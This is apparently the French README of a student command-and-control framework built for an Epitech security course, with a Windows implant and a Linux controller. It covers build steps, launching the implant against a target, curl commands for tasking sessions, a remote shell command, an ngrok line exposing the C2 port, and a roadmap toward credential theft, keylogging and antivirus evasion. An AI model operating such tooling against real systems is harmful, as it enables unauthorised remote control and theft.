# s0P0wn3d

Framework Command & Control (C2) modulaire, écrit en C, conçu dans le cadre
pédagogique du projet **Virology** (Epitech).

> **AVERTISSEMENT** : Cet outil est strictement pédagogique. Il ne doit être
> déployé que sur des machines de laboratoire contrôlées. Toute utilisation
> contre un système sans consentement écrit explicite est illégale et
> strictement interdite.

## Architecture

s0P0wn3d suit le pattern **implant-to-controller** :

- **Contrôleur** (Linux, C) : serveur HTTP multi-thread en C avec OpenSSL
- **Implant** (Windows, C) : agent utilisant WinHTTP + OpenSSL
- **Transport** : tunnel HTTP (se fond dans le trafic normal)
- **Chiffrement** : hybride RSA-4096 (échange de clé) + AES-256-GCM (payloads)

Voir [docs/architecture.md](docs/architecture.md) pour les détails.

## Installation

### Prérequis

**Contrôleur (Linux) :**
```bash
# Debian/Ubuntu
sudo apt install build-essential libssl-dev

# Arch Linux
sudo pacman -S base-devel openssl
```

**Implant (cross-compilation depuis Linux) :**
```bash
sudo apt install gcc-mingw-w64-x86-64
# OpenSSL pour MinGW : voir https://wiki.openssl.org/index.php/Compilation_and_Installation
```

### Compilation

```bash
# Contrôleur
cd controller
make

# Implant (cross-compile pour Windows)
cd implant
make
```

## Utilisation

### 1. Démarrer le contrôleur

```bash
cd controller
./s0p0wn3d_controller [port]    # port par défaut: 8443
```

### 2. Lancer l'implant (sur la VM Windows cible)

```cmd
s0p0wn3d_implant.exe <controller_ip> <port> [interval] [jitter]
:: Exemple:
s0p0wn3d_implant.exe 192.168.56.1 8443 5 2
```

### 3. Interagir avec les implants

```bash
# Lister les sessions actives
curl http://<controller_ip>:8443/sessions

# Assigner une tâche
curl -X POST http://<controller_ip>:8443/sessions/<session_id>/task \
  -H "Content-Type: application/json" \
  -d '{"command":"sysinfo","args":""}'

# Récupérer les résultats
curl http://<controller_ip>:8443/sessions/<session_id>/results
```

### Commandes disponibles (Phase 1)

| Commande  | Description                    |
|-----------|--------------------------------|
| `ping`    | Vérifie la connectivité        |
| `hostname`| Nom d'hôte de la machine       |
| `whoami`  | Utilisateur courant            |
| `cwd`     | Répertoire de travail courant  |
| `sysinfo` | Informations système complètes |
| `ls`      | Liste un répertoire            |
| `echo`    | Affiche les arguments          |
| `shell`   | Shell restreint (built-in)     |

## Preuve de chiffrement (Wireshark)

1. Capturer le trafic sur l'interface du contrôleur avec Wireshark
2. Filtrer par `http` ou le port du contrôleur
3. Observer que les payloads sont en base64 chiffré (AES-256-GCM)
4. Le contenu est illisible sans la clé privée RSA du contrôleur

## Prototype Python (Phase 1 — référence)

Un prototype Python est disponible dans `prototype/python/`. Il a servi à
valider le protocole avant l'implémentation en C. Il documente la faiblesse
de détection d'un implant Python (runtime interprété, signatures connues).

## Mapping MITRE ATT&CK

Voir [docs/mitre_mapping.md](docs/mitre_mapping.md).

## Structure du projet

```
s0p0wn3d/
├── controller/          # Serveur C2 (Linux, C)
│   ├── Makefile
│   ├── main.c
│   ├── http_server.h/.c
│   ├── sessions.h/.c
│   ├── task_queue.h/.c
│   └── crypto.h/.c
├── implant/             # Agent (Windows, C)
│   ├── Makefile
│   ├── main.c
│   ├── beacon.h/.c
│   ├── transport.h/.c
│   ├── crypto.h/.c
│   ├── task_runner.h/.c
│   └── modules.h/.c
├── shared/              # Code partagé
│   ├── protocol.h
│   ├── json.h/.c
│   └── base64.h/.c
├── prototype/           # Prototype Python (référence)
├── docs/                # Documentation
└── README.md
```

## Roadmap

| Phase | Objectif                              | Statut       |
|-------|---------------------------------------|-------------|
| 1     | Plan de contrôle (beacon + crypto)    | ✅ Implémenté |
| 2     | Shell restreint                       | ✅ Implémenté |
| 3     | Persistance                           | ⬜ À faire    |
| 4     | Extraction d'identifiants             | ⬜ À faire    |
| 5     | Modules étendus (keylog, loot, etc.)  | ⬜ À faire    |
| 6     | Durcissement (AV evasion, syscalls)   | ⬜ À faire    |

## Sources et références

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OpenSSL Documentation](https://www.openssl.org/docs/)
- [WinHTTP API](https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttp-start-page)
- C2 frameworks étudiés comme références architecturales : Metasploit, Sliver, Empire

## Licence

Projet pédagogique — Epitech Virology. Usage éducatif uniquement.



-----
ngrok http 8443 --scheme=http